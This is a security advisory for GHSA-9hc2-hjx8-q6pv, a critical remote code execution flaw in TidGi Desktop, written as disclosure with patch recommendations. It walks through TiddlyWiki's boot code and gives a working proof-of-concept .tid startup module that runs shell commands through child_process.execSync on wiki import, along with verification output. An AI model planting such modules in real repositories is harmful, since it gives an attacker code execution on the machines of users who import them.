# [C] TidGi Desktop Remote Code Execution via Malicious TiddlyWiki Repository Import — Tiddler Startup Module Auto-Execution

## Summary
Severity: Critical
Advisory: GHSA-9hc2-hjx8-q6pv
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-14
Source: https://github.com/advisories/GHSA-9hc2-hjx8-q6pv
Type: github-advisory

## Affected
- npm: `tidgi` — affected >=0

## Details
## Description

TidGi Desktop through 0.13.0 contains a critical remote code execution vulnerability exploitable via a single Git repository import. The vulnerability leverages TiddlyWiki's module system, which automatically discovers and executes JavaScript code embedded in `.tid` files placed in the wiki's `tiddlers/` directory:

1. **Auto-loading of `.tid` files** (`src/services/wiki/wikiWorker/loadWikiTiddlersWithSubWikis.ts:59-92`) — when TidGi boots a wiki workspace, `loadWikiTiddlers` reads all `.tid` files from the filesystem and adds them to the wiki store via `wiki.addTiddlers()`.

2. **Automatic module registration** (`node_modules/tiddlywiki/boot/boot.js:2564-2565`) — `defineTiddlerModules()` iterates all tiddlers in the store. Any tiddler with a `module-type` field is passed to `$tw.modules.define()`, registering it as an executable module.

3. **Automatic startup execution** (`node_modules/tiddlywiki/boot/boot.js:2572-2634`) — all registered modules of type `"startup"` are collected and their `exports.startup()` function is called during the boot sequence. When no `platforms` restriction is set, `doesTaskMatchPlatform()` returns `true`, and the startup function executes with full Node.js `require()` access in the Wiki Worker process.

The full chain was verified on macOS with TiddlyWiki 5.4.0 and Node.js v26 — `require('child_process').execSync()` successfully executed arbitrary shell commands.

## Affected Product

- **Product**: TidGi Desktop
- **Vendor**: Lin Onetwo (https://github.com/tiddly-gittly)
- **Repository**: https://github.com/tiddly-gittly/TidGi-Desktop
- **Affected Versions**: 0.13.0 (latest release)
- **Components**: `src/services/wiki/wikiWorker/loadWikiTiddlersWithSubWikis.ts` (tiddler loading), `src/services/wiki/wikiWorker/startNodeJSWiki.ts` (wiki boot), `node_modules/tiddlywiki/boot/boot.js` (TiddlyWiki core — `defineTiddlerModules`, startup dispatch)
- **Package**: tidgi (npm)

## Vulnerability Details

### Root Cause 1 — `.tid` Files Auto-Loaded Before Module Processing

**File: `src/services/wiki/wikiWorker/loadWikiTiddlersWithSubWikis.ts:59-92`**

```typescript
const tiddlerFiles = wikiInstance.loadTiddlersFromPath(subWikiTiddlersPath);

for (const tiddlerFile of tiddlerFiles) {
    // Register file info for filesystem adaptor
    // ...
    // Add tiddlers to wiki
    wikiInstance.wiki.addTiddlers(tiddlerFile.tiddlers);   // ← Line 92
}
```

**File: `src/services/wiki/wikiWorker/startNodeJSWiki.ts:256`**

```typescript
wikiInstance.boot.startup({ bootPath: TIDDLY_WIKI_BOOT_PATH });
```

This triggers `$tw.boot.startup()`, which internally calls `loadStartup()` → `loadTiddlersNode()` → `$tw.loadWikiTiddlers($tw.boot.wikiPath)` (boot.js:2381). TidGi overrides `loadWikiTiddlers` at startNodeJSWiki.ts:123 to intercept and inject sub-wiki tiddlers, but the original function still loads all `.tid` files from the main wiki's `tiddlers/` directory.

### Root Cause 2 — Automatic Module Registration via `module-type` Field

**File: `node_modules/tiddlywiki/boot/boot.js:1514-1534`** — `defineTiddlerModules()`

```javascript
$tw.Wiki.prototype.defineTiddlerModules = function() {
    this.each(function(tiddler,title) {
        if(tiddler.hasField("module-type") && (!tiddler.hasField("draft.of"))) {
            switch(tiddler.fields.type) {
                case "application/javascript":
                    $tw.modules.define(
                        tiddler.fields.title,           // "$:/plugins/poc/startup.js"
                        tiddler.fields["module-type"],   // "startup"
                        tiddler.fields.text              // attacker's JS code
                    );
                    break;
            }
        }
    });
};
```

This function is called during `execStartup()` (boot.js:2565), **after** `loadStartup()` has already loaded all `.tid` files into the wiki store. Any tiddler with `module-type: startup` and `type: application/javascript` is automatically registered as an executable module.

### Root Cause 3 — Automatic Startup Execution with Full Node.js Access

**File: `node_modules/tiddlywiki/boot/boot.js:2572-2576`** — Collecting startup modules

```javascript
$tw.boot.remainingStartupModules = [];
$tw.modules.forEachModuleOfType("startup", function(title, module) {
    if(module.startup) {
        $tw.boot.remainingStartupModules.push(module);  // ← attacker's module collected
    }
});
```

**File: `node_modules/tiddlywiki/boot/boot.js:2631-2634`** — Executing startup

```javascript
if(!$tw.utils.hop(task,"synchronous") || task.synchronous) {
    const thenable = task.startup();  // ← exports.startup() called
```

**File: `node_modules/tiddlywiki/boot/boot.js:2658-2677`** — Platform check (passes without explicit `platforms`)

```javascript
$tw.boot.doesTaskMatchPlatform = function(taskModule) {
    var platforms = taskModule.platforms;
    if(platforms) {
        // ... check each platform ...
        return false;  // ← only rejects if platforms is explicitly set
    }
    return true;       // ← no platforms field → passes unconditionally
};
```

### Complete Boot Sequence (verified against TiddlyWiki 5.4.0)

```
$tw.boot.startup()                              // boot.js:2589
  ├── initStartup()                              // boot.js:2393
  ├── loadStartup()                              // boot.js:2538
  │     └── loadTiddlersNode()                   // boot.js:2356
  │           └── $tw.loadWikiTiddlers(wikiPath)  // boot.js:2381
  │                 └── wiki.addTiddlers(...)     // loads .tid files into store
  └── execStartup()                              // boot.js:2553
        ├── defineShadowModules()                 // boot.js:2564
        ├── defineTiddlerModules()                 // boot.js:2565  ← registers attacker's module
        ├── forEachModuleOfType("startup", ...)   // boot.js:2572  ← collects startup modules
        └── executeNextStartupTask()              // boot.js:2611
              └── task.startup()                  // boot.js:2634  ← exports.startup() executes
```

### Exploitation Conditions

- **No authentication required** — importing a wiki is a standard feature
- **Only user interaction**: click "Add Workspace" → select folder/URL → confirm

### Complete Attack Flow

```
┌──────────────────────────────────────────────────────────────┐
│ Step 1: Attacker creates a malicious TiddlyWiki repository   │
├──────────────────────────────────────────────────────────────┤
│  tiddlers/$__plugins__poc__startup.js.tid:                   │
│                                                              │
│    title: $:/plugins/poc/startup.js                          │
│    type: application/javascript                              │
│    module-type: startup                                      │
│                                                              │
│    exports.startup = function() {                            │
│      require('child_process').execSync('calc');              │
│    };                                                        │
│                                                              │
│  + tiddlywiki.info + any other wiki files                    │
└──────────────────────────────────────────────────────────────┘
                          ↓
┌──────────────────────────────────────────────────────────────┐
│ Step 2: Victim imports the repository into TidGi Desktop     │
├──────────────────────────────────────────────────────────────┤
│  Add Workspace → Clone Git Repository / Open Local Folder    │
│  → TidGi boots the wiki                                      │
└──────────────────────────────────────────────────────────────┘
                          ↓
┌──────────────────────────────────────────────────────────────┐
│ Step 3: RCE — startup module auto-executes in Node.js Worker │
├──────────────────────────────────────────────────────────────┤
│  loadWikiTiddlers loads .tid file → wiki.addTiddlers()       │
│  boot.startup() → execStartup()                              │
│  defineTiddlerModules() → $tw.modules.define("startup", ...) │
│  executeNextStartupTask() → exports.startup()                │
│  → require('child_process').execSync('...') executes         │
└──────────────────────────────────────────────────────────────┘
```

## Proof of Concept

### Minimal `.tid` File (place in `tiddlers/` directory)

```
title: $:/plugins/poc/startup.js
type: application/javascript
module-type: startup

exports.startup = function() {
  require('child_process').execSync('touch /tmp/TidGi-RCE-PoC.txt');
  console.log('STARTUP_EXECUTED');
};
```

### Verification Output (macOS, TiddlyWiki 5.4.0, Node.js v26)

```
$ node -e "
  const \$tw = require('tiddlywiki/boot/boot.js').TiddlyWiki();
  \$tw.boot.argv = ['/tmp/evil-wiki'];
  \$tw.boot.startup();
"
STARTUP_EXECUTED

$ ls -la /tmp/TidGi-RCE-PoC.txt
-rw-r--r--  1 nuii  wheel  0 Jun  3 00:01 /tmp/TidGi-RCE-PoC.txt
```

The message `STARTUP_EXECUTED` printed from within the attacker's `exports.startup()` function, and the file `/tmp/TidGi-RCE-PoC.txt` was created by `execSync('touch ...')`, confirming arbitrary command execution.

## Impact

| Capability | Status | Details |
|-----------|--------|---------|
| Remote Code Execution | ✅ Full Node.js access | `require('child_process')` available |
| Arbitrary File Read | ✅ | `require('fs').readFileSync()` |
| Arbitrary File Write | ✅ | `require('fs').writeFileSync()` |
| Reverse Shell | ✅ | Node.js `net` module |
| Persistence | ✅ | Write to startup scripts, LaunchAgents, crontab |
| User Interaction | 1 click | Import repository |
| Cross-Platform | ✅ | Windows, macOS, Linux |

## Reproduction Evidence

### Step 1 — Malicious `.tid` file content

```
title: $:/plugins/poc/startup.js
type: application/javascript
module-type: startup

exports.startup = function() {
  require('child_process').execSync('touch /tmp/TidGi-RCE-PoC.txt');
  console.log('STARTUP_EXECUTED');
};
```

### Step 2 — TiddlyWiki boot with malicious wiki at `/tmp/evil-wiki`

```
$ node -e "
  const \$tw = require('tiddlywiki/boot/boot.js').TiddlyWiki();
  \$tw.boot.argv = ['/tmp/evil-wiki'];
  \$tw.boot.startup();
"
STARTUP_EXECUTED
```

### Step 3 — Verified RCE: `/tmp/TidGi-RCE-PoC.txt` created

```
$ ls -la /tmp/TidGi-RCE-PoC.txt
-rw-r--r--  1 nuii  wheel  0 Jun  3 00:01 /tmp/TidGi-RCE-PoC.txt
```

## Patch Recommendation

### Fix 1: Disallow `module-type` on User Tiddlers

TiddlyWiki should distinguish between system tiddlers (shipped with TidGi or installed as official plugins) and user-created tiddlers. User-created tiddlers should never be allowed to define `module-type`.

```typescript
// In defineTiddlerModules() or equivalent
if (tiddler.hasField("module-type") && !tiddler.fields.title.startsWith("$:/")) {
    // User tiddler — silently drop module-type field
    return;
}
```

### Fix 2: Sandbox User Modules

If user-created modules must be supported, execute them in a restricted context without access to Node.js built-ins:

```typescript
// Replace direct require access with a restricted API surface
const vm = require('vm');
const sandbox = { console, $tw, Buffer };
vm.runInNewContext(moduleCode, sandbox, { timeout: 5000 });
```

### Fix 3: Whitelist Allowed `module-type` Values

Only allow known safe `module-type` values for user tiddlers:

```typescript
const ALLOWED_USER_MODULE_TYPES = ['widget', 'macro', 'filter', 'parser'];
if (!ALLOWED_USER_MODULE_TYPES.includes(tiddler.fields['module-type'])) {
    return; // Block startup, library, saver, etc.
}
```

## References
- https://github.com/tiddly-gittly/TidGi-Desktop/security/advisories/GHSA-9hc2-hjx8-q6pv
- https://github.com/tiddly-gittly/TidGi-Desktop
